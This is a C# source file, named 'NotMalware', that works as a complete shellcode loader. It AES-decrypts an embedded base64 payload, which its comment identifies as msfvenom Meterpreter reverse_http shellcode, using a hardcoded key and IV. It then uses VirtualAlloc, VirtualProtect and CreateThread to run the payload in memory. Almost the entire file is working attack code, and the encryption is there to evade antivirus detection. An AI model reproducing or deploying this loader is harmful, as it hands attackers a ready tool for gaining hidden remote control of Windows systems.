using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace NotMalware
{
    internal class Program
    {
        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            // Shellcode (msfvenom -p windows/x64/meterpreter/reverse_http LHOST=... LPORT=... -f csharp)
            string bufEnc = "SLRi0i6SRkJm9ORiZJT+gos3Mi0LpQYpx4EV1tr9lKB8LeR29ZqWz0inOz0FPkAJyKsR7/wxHtGl9HGimAYx01ew3b05XyscHsXhZqsOuuf7AYuOzRjJGCsf1+9bArRaaRJVenofvCN14r8Ib8TIg2QFfYXQ/I1VTKDuqd7hf64R6rEkvSaq3uWpfUGMK1jqg1fC21Tw6COrjRMJb320R97s72ESBUdn+zYBUpZvJezCPcdmFN5pC2lXRysa4pxHg0fHd0QTD0dhzDy/+2d37D+YIJC+JTu1bXkMbGcIj61P0HvsF0ru/RyiJYFvRKGR9etCSYEito3WX0pGfQtQjCTI3Fae1uKBZ883xlrgYoQcAM1vEvTBH3hJE4lYMVgNfuVIwMK5oZvijSFO+zgF82+Cnscf9VFk4wKnmFBFeDy+QH7DWEUq0dWQ3xWUj9TY40aESZpfJXfDII+/AZWb1qyc9BrW1lYm8gdmjyHOEDvDlHXkGq6vFonflM6c3U5YTYXSyLg/k3DNg2huIaD5MqA08qMtzfxiRAgZZ96kDkYKUfXbn7xv2IJRb20Y6c12srhItxP18uOXiaR4myuAiGUKD6QEsdTD7U5IQ2RxzSWW4NiIMHj80+sx/TR2ajhhGUWtiinKu2r3S7TGpLmnMGsOI8R1589VnhmX6029JxWiFYjloQHzr6HWR5RsrFRtHD3dYQHv38bqMxDVUvzgajfAlKpaXfvWFavcqiNxy5g=";
            // Decrypt shellcode
            Aes aes = Aes.Create();
            byte[] key = new byte[16] { 0x1f, 0x86, 0x8b, 0xd5, 0x9c, 0xbf, 0x02, 0x2b, 0x25, 0x1d, 0xeb, 0x07, 0x91, 0xd8, 0xc1, 0x97 };
            byte[] iv = new byte[16] { 0xee, 0x8d, 0x63, 0x94, 0x6a, 0xc1, 0xf2, 0x96, 0xd8, 0xe4, 0xc5, 0xca, 0x82, 0xdf, 0xa5, 0xe2 };
            ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
            byte[] buf;
            using (var msDecrypt = new System.IO.MemoryStream(Convert.FromBase64String(bufEnc)))
            {
                using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {
                    using (var msPlain = new System.IO.MemoryStream())
                    {
                        csDecrypt.CopyTo(msPlain);
                        buf = msPlain.ToArray();
                    }
                }
            }

            // Allocate RW space for shellcode
            IntPtr lpStartAddress = VirtualAlloc(IntPtr.Zero, (UInt32)buf.Length, 0x1000, 0x04);

            // Copy shellcode into allocated space
            Marshal.Copy(buf, 0, lpStartAddress, buf.Length);

            // Make shellcode in memory executable
            UInt32 lpflOldProtect;
            VirtualProtect(lpStartAddress, (UInt32)buf.Length, 0x20, out lpflOldProtect);

            // Execute the shellcode in a new thread
            UInt32 lpThreadId = 0;
            IntPtr hThread = CreateThread(0, 0, lpStartAddress, IntPtr.Zero, 0, ref lpThreadId);

            // Wait until the shellcode is done executing
            WaitForSingleObject(hThread, 0xffffffff);
        }
    }
}

